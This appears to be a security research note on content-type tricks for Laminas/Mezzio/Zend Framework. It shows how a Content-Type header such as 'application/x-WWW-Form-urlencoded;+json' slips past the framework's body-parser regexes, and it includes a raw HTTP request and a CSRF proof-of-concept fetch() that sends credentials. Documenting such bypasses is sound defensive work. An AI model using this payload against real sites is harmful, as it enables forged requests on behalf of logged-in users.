### Laminas, Mezzio, Zend Framework

**Endpoint**
```php
$app->pipe(BodyParamsMiddleware::class);
...
public function indexAction() {
  $request = $this->getRequest();
```

**Source code**

By default, BodyParamsMiddleware composes the following strategies:

 * Mezzio\Helper\BodyParams\FormUrlEncodedStrategy
 * Mezzio\Helper\BodyParams\JsonStrategy

[/mezzio/mezzio-helpers/src/BodyParams/FormUrlEncodedStrategy.php](https://github.com/mezzio/mezzio-helpers/blob/37660f0d7e7c7db7e20e9d5ebed622379fb1e91a/src/BodyParams/FormUrlEncodedStrategy.php#L18-L22)
```php
class FormUrlEncodedStrategy implements StrategyInterface
{
  public function match(string $contentType) : bool
  {
    return 1 === preg_match('#^application/x-www-form-urlencoded($|[ ;])#', $contentType);
```

[/mezzio/mezzio-helpers/src/BodyParams/JsonStrategy.php](https://github.com/mezzio/mezzio-helpers/blob/37660f0d7e7c7db7e20e9d5ebed622379fb1e91a/src/BodyParams/JsonStrategy.php#L27-L31)
```php
class JsonStrategy implements StrategyInterface
{
  public function match(string $contentType) : bool
  {
    return 1 === preg_match('#^application/(|[\S]+\+)json($|[ ;])#', $contentType);
```

**JSON Content-Type**
```
application/XXX;+json
```

**HTTP Request**  
A different case is needed in order to bypass the FormUrlEncodedStrategy.
```http
POST /json HTTP/1.1
Host: localhost
Content-Type: application/x-WWW-Form-urlencoded;+json
Content-Length: 13

{"test":true}
```

**CSRF PoC**
```html
<script>
  fetch('http://localhost/json',{
    method:'POST',
    headers:{'Content-Type':'application/x-WWW-Form-urlencoded;+json'},
    body:'{"test":true}',
    credentials: 'include'
  })
</script>
```

**Multipart Content-Type**  
Same as [PHP](ct-tricks/PHP.md)